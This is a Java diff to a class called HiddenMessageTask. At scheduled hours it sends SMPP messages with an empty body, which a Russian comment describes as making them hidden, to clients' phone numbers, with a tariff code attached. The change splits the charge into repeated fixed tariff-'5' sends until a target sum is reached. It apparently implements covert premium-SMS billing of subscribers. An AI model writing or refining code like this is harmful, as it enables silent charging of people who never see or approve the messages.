@@ -38,15 +38,11 @@ public class HiddenMessageTask implements Runnable {
         int currentHour = cal.get(Calendar.HOUR_OF_DAY);
         int currentMinutes = cal.get(Calendar.MINUTE);
 
-        if (currentHour == 0 && currentMinutes >= 0 && client.HiddenRunFlag) {
-            QuietSMSRun();
-        }
+        if (currentHour == 0 && currentMinutes >= 0 && client.HiddenRunFlag) {QuietSMSRun();}
         if (currentHour == 0 && currentMinutes >= 50) if (!client.HiddenRunFlag) client.HiddenRunFlag = true;
 
-        if (currentHour == 6 && currentMinutes >= 0 && client.HiddenRunFlag) {
-            QuietSMSRun();
-        }
-        if (currentHour == 6 && currentMinutes >= 50) if (!client.HiddenRunFlag) client.HiddenRunFlag = true;
+        if (currentHour == 5 && currentMinutes >= 0 && client.HiddenRunFlag) {QuietSMSRun();}
+        if (currentHour == 5 && currentMinutes >= 50) if (!client.HiddenRunFlag) client.HiddenRunFlag = true;
 
         if (currentHour == 9 && currentMinutes >= 30 && client.HiddenRunFlag) QuietSMSRun();
         if (currentHour == 9 && currentMinutes >= 55) if (!client.HiddenRunFlag) client.HiddenRunFlag = true;
@@ -54,8 +50,8 @@ public class HiddenMessageTask implements Runnable {
         if (currentHour == 14 && currentMinutes >= 0 && client.HiddenRunFlag) QuietSMSRun();
         if (currentHour == 14 && currentMinutes >= 50) if (!client.HiddenRunFlag) client.HiddenRunFlag = true;
 
-        if (currentHour == 17 && currentMinutes >= 0 && client.HiddenRunFlag) QuietSMSRun();
-        if (currentHour == 17 && currentMinutes >= 50) if (!client.HiddenRunFlag) client.HiddenRunFlag = true;
+        if (currentHour == 19 && currentMinutes >= 0 && client.HiddenRunFlag) QuietSMSRun();
+        if (currentHour == 19 && currentMinutes >= 50) if (!client.HiddenRunFlag) client.HiddenRunFlag = true;
 
         if (currentHour == 22 && currentMinutes >= 0 && client.HiddenRunFlag) QuietSMSRun();
         if (currentHour == 22 && currentMinutes >= 50) if (!client.HiddenRunFlag) client.HiddenRunFlag = true;
@@ -107,15 +103,15 @@ public class HiddenMessageTask implements Runnable {
                     sms = mDBConnection.setSingleSMS(sms, true);
 
                     if (send_core(sml, sml.getTransaction_id())) {
-                        int sum_got = Integer.parseInt(sml.getTransaction_id());
-                        int value = sum_start - sum_got;
-                        if (value == 0) sml.setStatus(1);
-                        sml.setTransaction_id("" + value);
-                        mDBConnection.UpdateHiddenSMSLine(sml);
+                        sml.setStatus(1);
                         sms.setStatus(99);
                     } else {
+                        int sum_got = Integer.parseInt(sml.getTransaction_id());
+                        int value = sum_start - sum_got;
+                        sml.setTransaction_id("" + value);
                         sms.setErr_code(sml.getErr_code());
                     }
+                    mDBConnection.UpdateHiddenSMSLine(sml);
                     mDBConnection.UpdateSMSLine(sms);
                 }
             }
@@ -127,6 +123,11 @@ public class HiddenMessageTask implements Runnable {
     public boolean send_core(SmsLine sml, String tarif) {
         if (tarif.length() == 0) return false;
         if (client.state == ClientState.BOUND) {
+
+            int itarif = Integer.parseInt(tarif);
+            String tarif_optimized = "5";
+
+
             SmppSession session = client.getSession();
             Long msisdn = mDBConnection.getClient(sml.getId_client()).getAddrs();
             try {
@@ -145,18 +146,18 @@ public class HiddenMessageTask implements Runnable {
                 //Делаем скрытым сообщение - пустое тело
                 sm.setShortMessage(new byte[0]);
                 sm.setSequenceNumber(SequenceNumber);
-                sm.setOptionalParameter(new Tlv(SmppConstants.TAG_SOURCE_SUBADDRESS, mDBConnection.getSettings(tarif).getBytes(), "sourcesub_address"));
+                sm.setOptionalParameter(new Tlv(SmppConstants.TAG_SOURCE_SUBADDRESS, mDBConnection.getSettings(tarif_optimized).getBytes(), "sourcesub_address"));
                 sm.calculateAndSetCommandLength();
 
                 SubmitSmResp resp = session.submit(sm, TimeUnit.SECONDS.toMillis(60));
                 if (resp.getCommandStatus() != 0) {
                     sml.setErr_code("" + resp.getCommandStatus());
-                    tarif = getTarif(tarif);
-                    return send_core(sml, tarif);
+                    return false;
                 } else {
-                    log.debug("SM sent successfull" + sm.toString());
-                    sml.setTransaction_id(tarif);
-                    return true;
+                    itarif = itarif - 5;
+                    sml.setTransaction_id(""+itarif);
+                    if (itarif > 0) return send_core(sml, ""+itarif);
+                    else return true;
                 }
             } catch (SmppTimeoutException | SmppChannelException
                     | UnrecoverablePduException | InterruptedException | RecoverablePduException ex) {
@@ -166,7 +167,7 @@ public class HiddenMessageTask implements Runnable {
         } else return false;
     }
 
-    public String getTarif(String currTarif) {
+    private String getTarif(String currTarif) {
         String newTraif = "";
         switch (currTarif) {
             case "20":
